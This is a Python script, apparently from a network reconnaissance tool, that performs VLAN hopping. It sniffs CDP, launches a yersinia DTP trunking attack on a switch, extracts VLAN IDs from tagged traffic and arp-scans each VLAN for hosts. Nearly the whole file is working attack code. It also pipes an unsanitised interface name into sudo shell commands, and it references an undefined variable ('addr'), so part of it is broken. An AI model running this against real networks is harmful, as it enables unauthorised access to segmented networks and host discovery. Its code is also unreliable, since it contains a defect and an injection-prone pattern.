#!/usr/bin/env python3

# vlan collector utility, find vlans and perform an arp scan
# script will run through once, and store gathered data in the database
# command utility to scrape: tshark yersinia arp-scan
# gather information: vlan, host

# Python interpretation of the "vlan-hopper" project
# git clone https://github.com/nccgroup/vlan-hopping.git
# kennedyengineering 2020

# import collector module from parent directory
import os, sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from collector import Collector
import netifaces
import subprocess
import time
import ipaddress

# create collector
collector_name = "vlan"
collector = Collector(collector_name)

TAGSEC = 90
CDPSEC = 90
DTPWAIT = 20

# verify that the user supplied interface is available
ifaces = netifaces.interfaces()
iface = collector.misc_config["interface"]
if iface not in ifaces:
    collector.logger.error("Interface {} not available, exiting...".format(iface))
    collector.close()
    exit()
else:
    collector.logger.debug("Interface {} found".format(iface))

# verify that CDP is enabled
collector.logger.debug("Sniffing CDP Packets on interface {}".format(iface))
command = '''sudo tshark -a duration:{} -i {} -Y "cdp" -V 2>&1 | sort --unique'''.format(CDPSEC, iface)
output = subprocess.run(command, shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
output = output.split("\n")
for line in output:
    if "0 packets captured" in line:
        # exit if CDP was not found
        collector.logger.error("CDP is not enabled on the switch, exiting...")
        collector.close()
        exit()
collector.logger.debug("CDP is enabled on the switch")

# start yersinia exploit
collector.logger.debug("Starting attack on interface {}, waiting {} seconds".format(iface, DTPWAIT))
command = "sudo yersinia dtp -attack 1 -interface {}".format(iface)
yersinia = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
time.sleep(DTPWAIT)

# discover vlans
collector.logger.debug("Extracting VLAN IDs on interface {}, sniffing 802.1Q tagged packets for {} seconds".format(iface, TAGSEC))
command = '''sudo tshark -a duration:$TAGSEC -i $INT -Y "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique'''
command = command.replace("$TAGSEC", str(TAGSEC))
command = command.replace("$INT", iface)
vlan_ids = subprocess.run(command, shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
if not vlan_ids:
    collector.logger.error("No vlan found, exiting...")
    collector.close()
    yersinia.kill()
    exit()
vlan_ids = vlan_ids.split("\n")
vlan_ids = [string for string in vlan_ids if string != ""]

# arp scan vlans for hosts
#IP_ADDRESS = "10.10.1.0/24"
addrs = netifaces.ifaddresses(iface)[netifaces.AF_INET]
ip_addr = addr['addr']
subnet = addr['netmask']
net = str(ipaddress.ip_network('{}/{}'.format(ip_addr, subnet), strict=False))

for vlan in vlan_ids:
    collector.logger.debug("Scanning for hosts on vlan {}, with IP {}".format(vlan, net))
    command = '''sudo arp-scan -Q {} -I {} {} -t 500 2>&1 |grep "802.1Q VLAN="'''.format(vlan, iface, net)
    scan_results = subprocess.run(command, shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
    collector.logger.info(scan_results)
    
# bring down yersinia process
yersinia.kill()

collector.close()
